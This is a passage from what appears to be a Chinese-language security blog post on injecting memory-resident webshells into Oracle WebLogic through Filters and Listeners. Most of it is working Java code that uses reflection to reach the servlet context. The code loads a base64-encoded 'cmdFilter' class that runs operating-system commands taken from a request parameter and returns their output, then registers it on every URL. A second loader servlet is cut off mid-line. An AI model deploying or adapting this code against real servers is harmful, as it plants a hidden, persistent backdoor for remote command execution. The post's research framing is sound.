</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">==</span><span class="kc">null</span><span class="o">){</span><span class="k">throw</span> <span class="k">new</span> <span class="n">Exception</span><span class="o">(</span><span class="s">&#34;null&#34;</span><span class="o">);}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//加载字节码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">encode_class</span> <span class="o">=</span> <span class="s">&#34;yv66vgAAADQAkgoAHgBJCAA/CwBKAEsIAEwKAE0ATgoACQBPCABQCgAJAFEHAFIIAFMIAFQIAFUIAFYKAFcAWAoAVwBZCgBaAFsHAFwKABEAXQgAXgoAEQBfCgARAGAKABEAYQgAYgsAYwBkCgBlAGYKAGUAZwoAZQBoCwBpAGoHAGsHAGwHAG0BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC0xjbWRGaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcAbgEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABndyaXRlcgEAEExqYXZhL2lvL1dyaXRlcjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAFIHADAHAG8HAFwHAHABAAdkZXN0cm95AQAKU291cmNlRmlsZQEADmNtZEZpbHRlci5qYXZhDAAgACEHAHEMAHIAcwEAB29zLm5hbWUHAHQMAHUAcwwAdgB3AQADd2luDAB4AHkBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jAQACc2gBAAItYwcAegwAewB8DAB9AH4HAH8MAIAAgQEAEWphdmEvdXRpbC9TY2FubmVyDAAgAIIBAAJcYQwAgwCEDACFAIYMAIcAdwEAAAcAiAwAiQCKBwCLDACMAI0MAI4AIQwAjwAhBwCQDAAtAJEBAAljbWRGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAOamF2YS9pby9Xcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAB0AHgABAB8AAAAEAAEAIAAhAAEAIgAAAC8AAQABAAAABSq3AAGxAAAAAgAjAAAABgABAAAABQAkAAAADAABAAAABQAlACYAAAABACcAKAACACIAAAA1AAAAAgAAAAGxAAAAAgAjAAAABgABAAAACQAkAAAAFgACAAAAAQAlACYAAAAAAAEAKQAqAAEAKwAAAAQAAQAsAAEALQAuAAIAIgAAAYAABAAKAAAAoisSArkAAwIAOgQZBMYAjQE6BRIEuAAFtgAGEge2AAiZABsGvQAJWQMSClNZBBILU1kFGQRTOgWnABgGvQAJWQMSDFNZBBINU1kFGQRTOgW4AA4ZBbYAD7YAEDoGuwARWRkGtwASEhO2ABQ6BxkHtgAVmQALGQe2ABanAAUSFzoILLkAGAEAOgkZCRkItgAZGQm2ABoZCbYAGy0rLLkAHAMAsQAAAAMAIwAAAD4ADwAAAA0ACgAOAA8ADwASABEAIgASADoAFABPABcAXAAYAGwAGQCAABoAiAAbAI8AHACUAB0AmQAfAKEAIAAkAAAAZgAKABIAhwAvADAABQBcAD0AMQAyAAYAbAAtADMANAAHAIAAGQA1ADYACACIABEANwA4AAkAAACiACUAJgAAAAAAogA5ADoAAQAAAKIAOwA8AAIAAACiAD0APgADAAoAmAA/ADYABABAAAAAHAAF/QA6BwBBBwBCFP0ALAcAQwcAREEHAEH4ABoAKwAAAAYAAgBFACwAAQBGACEAAQAiAAAAKwAAAAEAAAABsQAAAAIAIwAAAAYAAQAAACcAJAAAAAwAAQAAAAEAJQAmAAAAAQBHAAAAAgBI&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode_class</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Decoder</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">encode_class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Method</span> <span class="n">defineClass</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">defineClass</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//这里为了适配weblogic 1036 必须反射获取webAppServletContext中的classLoader
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">loader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ClassLoader</span> <span class="n">ClassLoader0</span><span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">loader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Class</span> <span class="n">filter_class</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">defineClass</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">ClassLoader0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">//获取ChangeAwareClassLoader，因为cachedClasses这个变量在ChangeAwareClassLoader中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">classLoader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ClassLoader</span> <span class="n">classLoader1</span> <span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">classLoader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//获取cachedClasses
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">cachedClasses</span> <span class="o">=</span> <span class="n">classLoader1</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;cachedClasses&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">cachedClasses</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">cachedClasses_map</span> <span class="o">=</span> <span class="n">cachedClasses</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">classLoader1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Method</span> <span class="n">get</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;get&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">get</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//如果cachedClasses中不存在cmdFilter类
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">get</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cachedClasses_map</span><span class="o">,</span> <span class="s">&#34;cmdFilter&#34;</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//把cmdFilter的class 存入cachedClasses中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Method</span> <span class="n">put</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;put&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">put</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">put</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cachedClasses_map</span><span class="o">,</span> <span class="s">&#34;cmdFilter&#34;</span><span class="o">,</span> <span class="n">filter_class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//获取filterManager类
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Field</span> <span class="n">filterManager</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;filterManager&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">filterManager</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">filterManager</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//注册Filter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Method</span> <span class="n">registerFilter</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;registerFilter&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">[].</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">registerFilter</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">registerFilter</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">o</span><span class="o">,</span> <span class="s">&#34;test&#34;</span><span class="o">,</span> <span class="s">&#34;cmdFilter&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/*&#34;</span><span class="o">},</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;success!!!&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><img src="/images/image-20211106220909.png" alt=""></p>
<h2 id="listener"><a href="#listener" class="anchor-link">#</a><a href="#contents:listener" class="headings">Listener</a></h2>
<h3 id="listener-注册过程分析"><a href="#listener-注册过程分析" class="anchor-link">#</a><a href="#contents:listener-注册过程分析" class="headings">Listener 注册过程分析</a></h3>
<p>和Filter注册过程差不多，webAppServletContext中的registerListener方法可以注册Listener，但当context启动后不能直接通过该方法注册，下面来分析一下。
<img src="/images/image-20211106220946.png" alt="">
跟进<code>this.addListener()</code> ，看到根据类名创建EventListener对象，传入到<code>this.addListener(Listener)</code>。
<img src="/images/image-20211106221005.png" alt="">
然后再继续跟进<code>this.addListener() </code>，可以看到对当前线程是否启动进行检查。通过的话便可调用<code>this.eventsManager.addEventListener(t);</code> 添加Listener。
<img src="/images/image-20211106221024.png" alt="">
如果当前<code>webAppServletContext.ContextPhase.START ==this.phase</code> 那么就抛出异常
<img src="/images/image-20211106221043.png" alt="">
所以可以模拟添加Listener的方法。先通过反射创建EventListener，再调用eventsManager的addEventListener方法即可。</p>
<h3 id="实现代码-1"><a href="#实现代码-1" class="anchor-link">#</a><a href="#contents:实现代码-1" class="headings">实现代码</a></h3>
<p>测试Weblogic 1036和12.1.3成功</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sun.misc.BASE64Decoder</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.internal.EventsManager</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletRequestImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.internal.WebAppServletContext</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.EventListener</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">guguServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Thread</span> <span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//获取WebAppServletContext
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">workEntry</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.work.ExecuteThread&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;workEntry&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">workEntry</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">workentry</span> <span class="o">=</span> <span class="n">workEntry</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">thread</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">WebAppServletContext</span> <span class="n">webAppServletContext</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="o">{</span> <span class="c1">//weblogic 12.1.3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Field</span> <span class="n">connectionHandler</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;connectionHandler&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">connectionHandler</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Object</span> <span class="n">http</span> <span class="o">=</span> <span class="n">connectionHandler</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">Field</span> <span class="n">request1</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">request1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">ServletRequestImpl</span> <span class="n">servletRequest</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletRequestImpl</span><span class="o">)</span> <span class="n">request1</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">http</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//weblogic 1036
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">==</span><span class="kc">null</span><span class="o">){</span><span class="k">throw</span> <span class="k">new</span> <span class="n">Exception</span><span class="o">(</span><span class="s">&#34;null&#34;</span><span class="o">);}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//加载字节码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">encode_class</span> <span class="o">=</span><span 